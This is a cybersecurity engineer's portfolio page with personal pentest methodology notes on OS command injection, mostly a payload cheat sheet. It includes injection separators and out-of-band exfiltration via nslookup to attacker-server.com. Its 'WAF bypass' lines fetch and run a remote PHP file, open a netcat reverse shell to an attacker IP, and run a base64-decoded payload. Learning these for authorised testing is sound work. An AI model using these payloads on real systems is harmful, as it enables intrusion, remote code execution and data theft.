<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">

    <!--==================== CSS ====================-->
    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">

    <title>Methodology</title>
</head>
<body class="dark-theme">
    <!--==================== HEADER ====================-->
    <header class="header" id="header">
        <nav class="nav container">
            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
            <div class="nav__menu" id="nav-menu">
                <ul class="nav__list grid">
                    <li class="nav__item">
                        <a href="../../../../../index.html#home" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Home
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#skills" class="nav__link">
                            <i class="uil uil-file-alt nav__icon"></i> Skills
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#portfolio" class="nav__link">
                            <i class="uil uil-scenery nav__icon"></i> Portfolio
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../index.html#contact" class="nav__link">
                            <i class="uil uil-estate nav__icon"></i> Contact Me
                        </a>
                    </li>
                    <li class="nav__item">
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
                            <i class="uil uil-estate nav__icon"></i> Methodology
                        </a>
                    </li>
                </ul>
                <i class="uil uil-times nav__close" id="nav-close"></i>
            </div>

            <div class="nav__btns">
                <!--Theme change button-->
                <i class="uil uil-moon change-theme" id="theme-button"></i>

                <div class="nav__toggle" id="nav-toggle">
                    <i class="uil uil-apps"></i>
                </div>
            </div>
        </nav>
    </header>
    <!--==================== END-HEADER ====================-->


<!--==================== MAIN ====================-->
    <main class="main"><article id="7fcb8bba-ff66-41fe-a477-c37f4edbaefd" class="page sans"><header><h1 class="page-title">Command Injection</h1></header><div class="page-body"><ul id="885ff212-5916-4cd3-9a7b-5b2512cbb241" class="bulleted-list"><li style="list-style-type:disc">Search for cmd= in URLS</li></ul><ul id="a2729614-b2c9-47a1-a5a3-9b8dbe18c208" class="bulleted-list"><li style="list-style-type:disc">search for inputs that allow for system level commands to be executedâ€¦</li></ul><ul id="5734953b-c3dc-4b9b-bdce-5c38eb424791" class="bulleted-list"><li style="list-style-type:disc">Follow this guide for checks: <a href="https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection">https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection</a></li></ul><p id="19269227-16d2-4e10-93eb-737a08203951" class="">
</p><p id="1071b24a-9cb3-4fc9-955d-3714e91c017f" class=""><strong>Payloads:</strong></p><p id="310bd382-674f-4432-a482-2819a83bfac8" class=""><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p><pre id="93605604-da82-41b4-9287-e8e74ac6b700" class="code"><code>Examples (Also URL encoding these payloads)
#Regular
productid=1 &amp; whoami #
#Out of band
&amp; sleep 10 #
#Output redirection
&amp; whoami &gt; /valid/accessible/path.txt#
#Blind, Out-of-band
&amp; nslookup &lt;website&gt; #
#Blind, Out-of-band Data Exfiltration
&amp; nslookup `whoami`.&lt;website&gt; #
&amp; nslookup $(whoami).&lt;website&gt; #
--------------------------------------------------------------------
Special Characters
&amp;
;
Newline (0x0a or \n)
&amp;&amp;
|
||
command `
$(command )
--------------------------------------------------------------------
Useful Commands: Linux
whoami
ifconfig
ls
uname -a
--------------------------------------------------------------------
Useful Commands: Windows
whoami
ipconfig
dir
ver
--------------------------------------------------------------------
Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id 
ls|id; ls |id; ls| id; ls | id 
ls&amp;&amp;id; ls &amp;&amp;id; ls&amp;&amp; id; ls &amp;&amp; id 
ls&amp;id; ls &amp;id; ls&amp; id; ls &amp; id 
ls %0A id
--------------------------------------------------------------------
Time Delay Commands
&amp; ping -c 10 127.0.0.1 &amp;
--------------------------------------------------------------------
Redirecting output
&amp; whoami &gt; /var/www/images/output.txt &amp;
--------------------------------------------------------------------
OOB (Out Of Band) Exploitation
&amp; nslookup attacker-server.com &amp;
&amp; nslookup `whoami`.attacker-server.com &amp;
-------------------------------------------------------------------
WAF bypasses
vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
/tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;
vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
--------------------------------------------------------------------</code></pre><p id="2bb56507-c2a6-49a3-b8c1-57d1e2c890aa" class="">
</p><p id="012b0640-f696-4582-89ae-a59938f54623" class=""><strong>OS Command Injections:</strong></p><p id="858ca5f2-718c-4a6b-ba06-5fe734d0a245" class="">
</p><p id="22022ace-b913-4652-92be-7144c490d943" class="">Blind:</p><p id="a737f6cf-07b5-453a-874e-cddafff5d45b" class="">Send sleep commands to test</p><pre id="7763900a-afc4-4c90-9e41-3e03ce558639" class="code"><code>sleep 5</code></pre><p id="1b03022a-af39-4f40-9438-74f281f16204" class=""><strong>We can test for cmd injection using web server root directories:</strong></p><pre id="18308b41-3c4f-45b8-8a58-13e3b86364e4" class="code"><code>touch test.txt &lt;location&gt;

/var/www/
/var/www/html/
/var/www/public/
/var/www/static/
/images/</code></pre><p id="1604092a-6529-45ae-8939-24a3311a3dbc" class="">
</p></div></article></main></main>

    <!--==================== FOOTER ====================-->
    <footer class="footer">
        <div class="footer__bg">
            <div class="footer__container container grid">
                <div>
                    <h1 class="footer__title">Tyler O'Hare</h1>
                    <span class="footer__subtitle">Cybersecurity Engineer</span>
                </div>

                <ul class="footer__links">
                    <li>
                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
                    </li>

                    <li>
                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
                    </li>

                    <li>
                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
                    </li>
                    <li>
                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
                    </li>
                </ul>

                <div class="footer__socials">
                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
                        <i class="uil uil-github-alt"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
                        <i class="uil uil-linkedin-alt"></i>
                    </a>
                </div>
            </div>

            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
        </div>

    </footer>
    <!--==================== END-FOOTER ====================-->


    <!--==================== SCROLL TOP ====================-->
    <a href="" class="scrollup" id="scroll-up">
        <i class="uil uil-arrow-up scroll__icon"></i>
    </a>

    <!--==================== SWIPER JS ====================-->
    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>

    <!--==================== MAIN JS ====================-->
    <script src="../../../../../../assets/js/main.js"></script>
</body>
</html>